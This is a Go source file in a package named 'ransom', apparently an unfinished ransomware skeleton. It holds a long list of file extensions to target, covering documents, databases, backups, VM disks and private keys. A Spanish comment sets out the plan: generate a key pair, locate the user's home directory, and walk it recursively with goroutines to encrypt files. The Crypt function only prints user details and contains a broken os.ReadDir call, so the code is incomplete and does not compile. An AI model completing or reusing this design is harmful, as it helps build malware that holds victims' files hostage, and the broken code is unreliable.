package ransom

import (
	"fmt"
	"os"
	"os/user"
)

var Extensions = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg",
	".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg",
	".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm",
	".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm",
	".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z",
	".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg",
	".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg",
	".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp",
	".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs",
	".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb",
	".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk",
	".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr",
	".crt", ".key", ".pfx", ".der",
}

/* la movida:
generamos localmente el par de claves
la publica la guardamos, .dockerignore para la privada, .gitignore para las dos (regla en makefile)

de alguna forma hemos de poder cargar en memoria la clave publica en la ejecucion
cuando lo hagamos: obtenemos home user:
- primero desde api
- fallback, $HOME
- fallback /home/$USER
- error si tal

iteramos desde la carpeta appendeande /infection
cada colision con un fichero deberia ser una gorutina
dir -> go(checkea file), si file es un dir pusheamos a cola, si no, procesa y prou

gopapa espera mediante canal al fin del parseo del directorio, y despues de forma recursiva lanzamos para cada dir

(go Dir() -> { go File() }) ??


*/

func Crypt() {
	u, err := user.Current()
	if err != nil {

	}
	uid := u.Uid
	gid := u.Gid
	username := u.Username
	name := u.Name
	homeDir := u.HomeDir
	fmt.Printf("User data:\nuid %s\ngid: %s\nusername: %s\nname: %s\nhome:  %s\n", uid, gid, username, name, homeDir)

	files, _ := os.ReadDir()
}

func Reverse(r string) {

}
